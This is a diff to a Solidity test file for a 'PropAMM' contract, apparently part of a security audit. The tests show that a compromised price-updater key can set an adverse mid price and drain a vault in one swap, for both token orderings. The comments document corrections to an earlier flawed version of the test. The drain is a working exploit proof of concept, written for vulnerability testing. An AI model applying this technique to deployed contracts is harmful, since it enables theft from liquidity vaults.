@@ -74,10 +74,52 @@ contract CapitanMonasterioQuoteAndPullTest is Test {
 
     /// @dev Mirrors the router's push-payment model: `tokenIn` lands on the venue contract before
     /// `swap()` is called, so calling `swap()` directly here needs the same pre-transfer.
-    function _fundTakerAndPush(address from, uint256 amountIn) internal {
-        tokenIn.mint(from, amountIn);
+    function _fundTakerAndPush(MockERC20 tIn, address venue, address from, uint256 amountIn) internal {
+        tIn.mint(from, amountIn);
         vm.prank(from);
-        tokenIn.transfer(address(propAmm), amountIn);
+        tIn.transfer(venue, amountIn);
+    }
+
+    /// @dev `new MockERC20()` addresses are `keccak256(this, nonce)` — deterministic given the
+    /// same deployer and call sequence, not random, and NOT ordered by deploy sequence either (the
+    /// hash doesn't preserve "deployed first" as "numerically smaller"). Re-running the same test
+    /// always lands on the same relative order, so proving the drain holds under BOTH orderings of
+    /// `tokenIn`/`tokenOut` needs forcing each one, not re-running and hoping. Bounded retry: each
+    /// draw is close to a coin flip over which address comes out smaller, so 64 draws make missing
+    /// either order for 64 consecutive tries astronomically unlikely.
+    function _deployWithForcedOrder(bool wantTokenInIsToken0)
+        internal
+        returns (MockERC20 tIn, MockERC20 tOut, PropAMM amm, address vlt)
+    {
+        for (uint256 i = 0; i < 64; i++) {
+            MockERC20 candidateIn = new MockERC20();
+            MockERC20 candidateOut = new MockERC20();
+            if ((address(candidateIn) < address(candidateOut)) == wantTokenInIsToken0) {
+                tIn = candidateIn;
+                tOut = candidateOut;
+                break;
+            }
+        }
+        require(address(tIn) != address(0), "could not find the requested token order in 64 draws");
+
+        vlt = makeAddr(wantTokenInIsToken0 ? "vault-tokenIn-is-token0" : "vault-tokenOut-is-token0");
+
+        address[] memory updaters = new address[](1);
+        updaters[0] = updater;
+        PropAMM.PairConfig[] memory pairs = new PropAMM.PairConfig[](1);
+        pairs[0] = PropAMM.PairConfig({token0: address(tIn), token1: address(tOut), vault: vlt});
+
+        amm = PropAMM(
+            address(
+                new ERC1967Proxy(
+                    address(new PropAMM()), abi.encodeCall(PropAMM.initialize, (owner, updaters, ORACLE, pairs))
+                )
+            )
+        );
+
+        tOut.mint(vlt, VAULT_TOKEN_OUT_BALANCE);
+        vm.prank(vlt);
+        tOut.approve(address(amm), type(uint256).max);
     }
 
     //------------------------------
@@ -103,24 +145,43 @@ contract CapitanMonasterioQuoteAndPullTest is Test {
     /// control proven above), so whoever holds it can write ANY `mid` — `_pricing` only checks
     /// `mid != 0` (`PropAMM.sol:298`), with no comparison against an external reference.
     ///
-    /// CORRECTION from a second review: an earlier version always wrote a LOW `adverseMid` and
-    /// asserted only that the vault's `tokenOut` balance dropped. That is only an attack when
-    /// `tokenOut` is token0 — `mid` prices token0 in token1 (`PropAMM.sol:306-310`), so which
-    /// direction counts as "cheap for the attacker" flips with deploy-time token ordering. The
-    /// version that shipped happened to deploy with `tokenIn` as token0, where a LOW mid makes
-    /// `tokenOut` MORE expensive: the logged run paid ~400 `tokenIn` (worth 1,000,000 `tokenOut`
-    /// at the honest price) for only 10,000 `tokenOut` — the attacker overpaid massively, the
-    /// opposite of a drain. The `tokenOut`-balance-only assertion couldn't catch this because it
-    /// ignored what the vault received in `tokenIn`.
-    ///
-    /// Fixed two ways: the adverse `mid` is now picked per the actual token order, so the test
-    /// drains the vault regardless of which address happens to deploy as token0; and the
-    /// assertion compares VALUE (the vault's `tokenOut` left, plus the `tokenIn` it received,
-    /// both priced at the honest mid) against its starting value, not unit count.
-    function test_compromisedUpdaterKey_drainsVaultWithAdverseMid() public {
+    /// CORRECTION from a second review (3 points, all confirmed independently before fixing):
+    /// 1. An earlier version always wrote a LOW `adverseMid` and asserted only that the vault's
+    ///    `tokenOut` balance dropped. That is only an attack when `tokenOut` is token0 — `mid`
+    ///    prices token0 in token1 (`PropAMM.sol:306-310`), so which direction counts as "cheap for
+    ///    the attacker" flips with deploy-time token ordering. The version that shipped happened
+    ///    to deploy with `tokenIn` as token0, where a LOW mid makes `tokenOut` MORE expensive: the
+    ///    logged run paid ~400 `tokenIn` (worth 1,000,000 `tokenOut` at the honest price) for only
+    ///    10,000 `tokenOut` — the attacker overpaid massively, the opposite of a drain.
+    /// 2. The fix after that picked `adverseMid` per the actual token order, and the writeup
+    ///    claimed re-running the test 5 times "confirmed it's not order-flaky." Wrong: `new
+    ///    MockERC20()` addresses are `keccak256(this, nonce)` — deterministic given the same
+    ///    deployer and call sequence, so re-running the identical test always lands on the same
+    ///    order. The 5 runs were 5 copies of the same branch; the other branch was never executed.
+    ///    Fixed here by forcing each order explicitly (`_deployWithForcedOrder`) and testing both
+    ///    as separate cases, rather than letting whichever order comes out of `setUp` stand in for
+    ///    "both."
+    /// 3. The value assertion was `assertLt(after, before)`, which a 1-wei loss also satisfies —
+    ///    it couldn't tell a real drain from a rounding error. Fixed by requiring the vault's value
+    ///    drop to less than 5% of its starting value (it drops to about 1%; 5% leaves slack for
+    ///    `_priceImpact`/rounding without being a tautology).
+    function test_compromisedUpdaterKey_drainsVaultWithAdverseMid_tokenInIsToken0() public {
+        _runDrainScenario(true);
+    }
+
+    /// @notice Same scenario, token order forced the other way: `tokenOut` is token0, so the mid
+    /// that makes it cheap for the attacker is a LOW one instead of a HIGH one. Exercises the
+    /// branch the single-order version never ran.
+    function test_compromisedUpdaterKey_drainsVaultWithAdverseMid_tokenOutIsToken0() public {
+        _runDrainScenario(false);
+    }
+
+    function _runDrainScenario(bool tokenInIsToken0) internal {
+        (MockERC20 tIn, MockERC20 tOut, PropAMM amm, address vlt) = _deployWithForcedOrder(tokenInIsToken0);
+        assertEq(address(tIn) < address(tOut), tokenInIsToken0, "forced order sanity check");
+
         _updatePriceAs(updater, 0, HONEST_MID);
 
-        bool tokenInIsToken0 = address(tokenIn) < address(tokenOut);
         // `_pricing`: tokenIn==token0 -> amountOut = amountIn*mid/SCALE (higher mid = more out);
         // tokenOut==token0 -> amountOut = amountIn*SCALE/mid (lower mid = more out). Either way,
         // this is the mid that makes tokenOut cheap for whoever is buying it with tokenIn.
@@ -132,33 +193,33 @@ contract CapitanMonasterioQuoteAndPullTest is Test {
         // exactly this ("the most this pair can pay"), so reusing it keeps the attacker's input
         // size honest to the contract's own cap instead of hand-picked.
         (uint256 maxFillableIn, uint256 expectedOut) =
-            propAmm.quoteFillable(address(tokenIn), address(tokenOut), type(uint128).max);
+            amm.quoteFillable(address(tIn), address(tOut), type(uint128).max);
 
-        _fundTakerAndPush(attacker, maxFillableIn);
+        _fundTakerAndPush(tIn, address(amm), attacker, maxFillableIn);
         vm.prank(attacker);
-        uint256 amountOut =
-            propAmm.swap(address(tokenIn), address(tokenOut), maxFillableIn, expectedOut, attacker, block.timestamp);
+        uint256 amountOut = amm.swap(address(tIn), address(tOut), maxFillableIn, expectedOut, attacker, block.timestamp);
 
         assertEq(amountOut, expectedOut, "drained exactly what quoteFillable priced at the adverse mid");
 
         // Value check, not a unit count: convert what the vault now holds in tokenIn back to its
         // tokenOut-equivalent AT THE HONEST PRICE, using the same tokenIn/tokenOut-ordering
         // formula `_pricing` itself uses, and compare the total against the vault's starting
-        // value. This is exactly what the earlier version's tokenOut-balance-only assertion missed.
-        uint256 vaultTokenInBalance = tokenIn.balanceOf(vault);
+        // value — and require the drop to be material (below 5% of starting value), not just any
+        // drop, so a 1-wei loss couldn't pass this assertion the way it could before.
+        uint256 vaultTokenInBalance = tIn.balanceOf(vlt);
         uint256 vaultTokenInValueInTokenOut = tokenInIsToken0
             ? vaultTokenInBalance * HONEST_MID / PRICE_SCALE
             : vaultTokenInBalance * PRICE_SCALE / HONEST_MID;
-        uint256 vaultTotalValueAfterAtHonestPrice = tokenOut.balanceOf(vault) + vaultTokenInValueInTokenOut;
+        uint256 vaultTotalValueAfterAtHonestPrice = tOut.balanceOf(vlt) + vaultTokenInValueInTokenOut;
 
         assertLt(
             vaultTotalValueAfterAtHonestPrice,
-            VAULT_TOKEN_OUT_BALANCE,
-            "vault's total value (tokenOut left + tokenIn received, both at the honest price) should be measurably below its starting value"
+            VAULT_TOKEN_OUT_BALANCE * 5 / 100,
+            "vault's total value (tokenOut left + tokenIn received, both at the honest price) should drop below 5% of its starting value, not just any amount"
         );
         emit log_named_uint("tokenOut drained in one tx", amountOut);
         emit log_named_uint("tokenIn the attacker paid for it", maxFillableIn);
-        emit log_named_uint("vault tokenOut balance remaining", tokenOut.balanceOf(vault));
+        emit log_named_uint("vault tokenOut balance remaining", tOut.balanceOf(vlt));
         emit log_named_uint("vault total value after, at honest price (tokenOut units)", vaultTotalValueAfterAtHonestPrice);
         emit log_named_uint("vault starting value (tokenOut units)", VAULT_TOKEN_OUT_BALANCE);
     }
@@ -172,7 +233,7 @@ contract CapitanMonasterioQuoteAndPullTest is Test {
         _updatePriceAs(updater, 0, HONEST_MID);
         uint256 expected = propAmm.quote(address(tokenIn), address(tokenOut), AMOUNT_IN);
 
-        _fundTakerAndPush(taker, AMOUNT_IN);
+        _fundTakerAndPush(tokenIn, address(propAmm), taker, AMOUNT_IN);
         vm.prank(taker);
         uint256 amountOut = propAmm.swap(address(tokenIn), address(tokenOut), AMOUNT_IN, expected, taker, block.timestamp);
 
@@ -192,7 +253,7 @@ contract CapitanMonasterioQuoteAndPullTest is Test {
 
         _updatePriceAs(updater, 50 * PRICE_SCALE / 10_000, HONEST_MID); // honest 50bps spread update
 
-        _fundTakerAndPush(taker, AMOUNT_IN);
+        _fundTakerAndPush(tokenIn, address(propAmm), taker, AMOUNT_IN);
         vm.prank(taker);
         // Selector-only: the exact second argument also bakes in `_priceImpact`'s charge for this
         // fill's size against the vault, incidental to this scenario.
@@ -212,7 +273,7 @@ contract CapitanMonasterioQuoteAndPullTest is Test {
 
         uint256 looseMinOut = earlierQuote * 95 / 100; // a 5% slippage tolerance the taker declared
 
-        _fundTakerAndPush(taker, AMOUNT_IN);
+        _fundTakerAndPush(tokenIn, address(propAmm), taker, AMOUNT_IN);
         vm.prank(taker);
         uint256 amountOut = propAmm.swap(address(tokenIn), address(tokenOut), AMOUNT_IN, looseMinOut, taker, block.timestamp);
 
